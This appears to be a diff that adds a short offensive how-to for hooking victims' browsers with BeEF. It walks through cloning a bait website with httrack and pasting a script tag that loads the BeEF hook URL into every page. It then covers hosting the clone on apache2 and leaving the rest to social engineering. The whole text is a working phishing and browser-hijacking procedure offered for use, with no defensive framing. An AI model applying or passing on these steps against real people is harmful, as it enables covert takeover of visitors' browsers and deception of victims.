@@ -1,0 +1,30 @@
+How to hook a browser with beEF
+
+Launch beEF (Either using bash script or commands)
+
+cd beef
+./beef
+or
+beef
+
+Take note of the "Hook URL" that is running on your wlan0 interface, and the "UI URL".
+
+Open a web browser, and paste the UI URL into it. This will take you to the beEF graphical interface.
+
+Find a webpage (preferably only a few pages, not social media) that you want to use to bait the victim.
+
+Use httrack to clone the website.
+
+Open the index.html file in your html editor, and paste the following text anywhere in between two "<head>" or "<body>" tags:
+
+<script src="[Hook URL]"></script>
+
+Do the same for all other html files in the cloned website directory.
+
+Copy all files in the cloned direccltory to /var/www/html
+
+Start the apache2 server:
+
+service apache2 start
+
+You can access your hooked webpage by typing in your ip address. The rest of the process is up to you, and will require social engineering.
